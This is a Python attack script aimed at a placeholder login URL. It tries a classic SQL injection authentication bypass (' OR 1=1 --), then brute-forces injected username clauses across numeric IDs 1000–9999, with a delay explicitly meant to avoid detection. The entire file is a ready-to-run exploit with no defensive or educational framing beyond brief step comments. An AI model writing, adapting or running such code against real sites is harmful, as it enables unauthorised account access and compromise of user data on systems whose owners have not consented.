import requests
import time

# Target web application URL
target_url = "http://examplewebsiteekak.com/login"  # Replace with the actual target URL
login_payload = {
    'username': '',  # Username parameter (this will be exploited)
    'password': ''   # Password parameter (this will be exploited)
}

# SQL Injection payload to bypass login
# The following payload is intended to bypass authentication by commenting out the rest of the query
# Example: ' OR 1=1 -- (the '--' comments out the rest of the SQL query)
sql_injection_payload = "' OR 1=1 --"

# Define the session for persistent requests
session = requests.Session()

def send_request(username, password):
    login_payload['username'] = username
    login_payload['password'] = password
    try:
        response = session.post(target_url, data=login_payload)
        return response
    except requests.RequestException as e:
        print(f"Error sending request: {e}")
        return None

def perform_sql_injection():
    # Step 1: Test SQL Injection with the payload
    print("Testing SQL Injection with payload:", sql_injection_payload)
    response = send_request(sql_injection_payload, sql_injection_payload)
    
    # Step 2: Check if the login was successful
    if response:
        # Checking if the response contains a keyword indicating successful login
        if "Welcome" in response.text:  # Replace "Welcome" with text found on a successful login
            print(f"SQL Injection successful! Logged in as user: {sql_injection_payload}")
        else:
            print("SQL Injection failed. No login.")
    else:
        print("Error: Failed to send request.")

def brute_force_sql_injection():
    # Step 3: Perform a basic brute-force SQL injection attack on the username field
    print("Starting brute-force SQL injection on username field...")
    
    for username in range(1000, 9999):  # Simple brute-force with numeric user IDs from 1000 to 9999
        username = str(username)
        payload = f"' OR username='{username}' --"
        response = send_request(payload, sql_injection_payload)
        
        if response:
            # Check if the response indicates that the user exists
            if "Welcome" in response.text:  # Replace "Welcome" with text found on a successful login
                print(f"SQL Injection successful! User ID: {username}")
                break
        time.sleep(0.5)  # Delay to avoid detection (optional, based on website rate-limiting)

def main():
    # Initial attack to see if simple SQL Injection works
    perform_sql_injection()

    # Brute-force attack on the username field
    brute_force_sql_injection()

if __name__ == "__main__":
    main()
